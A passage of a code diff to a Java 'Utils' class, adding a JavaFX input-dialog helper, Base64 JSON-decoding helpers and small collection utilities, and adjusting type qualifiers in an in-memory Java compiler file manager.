+   public static String showInputBox(String title, String header, String inputLabel, String defaultValue) {
+      Alert alert = getAlert(AlertType.INFORMATION);
+      alert.setTitle(title);
+      alert.setHeaderText(header);
+      TextField inputText = new TextField(defaultValue);
+      GridPane inputPane = new GridPane();
+      inputPane.setMaxWidth(Double.MAX_VALUE);
+      inputPane.add(new Label(inputLabel), 0, 0);
+      inputPane.add(inputText, 1, 0);
+      alert.getDialogPane().setContent(inputPane);
+      Optional result = alert.showAndWait();
+      if (result.isPresent()) {
+         String inputValue = inputText.getText().trim();
+         return inputValue;
+      } else {
+         return null;
+      }
+   }
+
    public static String getOrDefault(JSONObject obj, String key, Class type) {
       String result = "";
       if (obj.has(key)) {
@@ -1094,7 +1159,7 @@ public class Utils {
       return s.substring(1, s.length() - 1);
    }
 
-   private static Collector<Byte, ?, byte[]> toByteArray() {
+   private static Collector<Byte, ?, byte[]>  toByteArray() {
       return Collector.of(ByteArrayOutputStream::new, ByteArrayOutputStream::write, (baos1, baos2) -> {
          try {
             baos2.writeTo(baos1);
@@ -1105,12 +1170,53 @@ public class Utils {
       }, ByteArrayOutputStream::toByteArray);
    }
 
+   public static JSONObject JsonAndDecode(String jsonStr) {
+      JSONObject jsonObject = new JSONObject(jsonStr);
+      Iterator var2 = jsonObject.keySet().iterator();
+
+      while(var2.hasNext()) {
+         String key = (String)var2.next();
+         jsonObject.put(key, new String(Base64.getDecoder().decode(jsonObject.getString(key))));
+      }
+
+      return jsonObject;
+   }
+
+   public static JSONObject DecodeJsonObj(JSONObject jsonObj) {
+      Iterator var1 = jsonObj.keySet().iterator();
+
+      while(var1.hasNext()) {
+         String key = (String)var1.next();
+         jsonObj.put(key, new String(Base64.getDecoder().decode(jsonObj.getString(key))));
+      }
+
+      return jsonObj;
+   }
+
+   public static Object[] appendArray(Object[] arr, Object value) {
+      int oldLength = arr.length;
+      Object[] newArr = Arrays.copyOf(arr, arr.length + 1);
+      newArr[oldLength] = value;
+      return newArr;
+   }
+
+   public static JSONObject DecodeAndJson(String jsonStr) {
+      String decodedJson = new String(Base64.getDecoder().decode(jsonStr));
+      JSONObject jsonObject = new JSONObject(decodedJson);
+      return jsonObject;
+   }
+
+   public static Object getLastOfList(List list) {
+      int size = list.size();
+      return list.get(size - 1);
+   }
+
    public static class MyJavaFileManager extends ForwardingJavaFileManager {
       protected MyJavaFileManager(JavaFileManager fileManager) {
          super(fileManager);
       }
 
-      public JavaFileObject getJavaFileForInput(Location location, String className, Kind kind) throws IOException {
+      public JavaFileObject getJavaFileForInput(JavaFileManager.Location location, String className, JavaFileObject.Kind kind) throws IOException {
          JavaFileObject javaFileObject = (JavaFileObject)Utils.fileObjects.get(className);
          if (javaFileObject == null) {
             super.getJavaFileForInput(location, className, kind);
@@ -1119,8 +1225,8 @@ public class Utils {
          return javaFileObject;
       }
 
-      public JavaFileObject getJavaFileForOutput(Location location, String qualifiedClassName, Kind kind, FileObject sibling) throws IOException {
-         JavaFileObject javaFileObject = new Utils.MyJavaFileObject(qualifiedClassName, kind);
+      public JavaFileObject getJavaFileForOutput(JavaFileManager.Location location, String qualifiedClassName, JavaFileObject.Kind kind, FileObject sibling) throws IOException {
+         JavaFileObject javaFileObject = new MyJavaFileObject(qualifiedClassName, kind);
          Utils.fileObjects.put(qualifiedClassName, javaFileObject);
          return javaFileObject;
       }
@@ -1188,7 +1294,7 @@ public class Utils {
          this.source = source;
       }
 
-      public MyJavaFileObject(String name, Kind kind) {
+      public MyJavaFileObject(String name, JavaFileObject.Kind kind) {
          super(URI.create("String:///" + name + kind.extension), kind);
          this.source = null;
       }
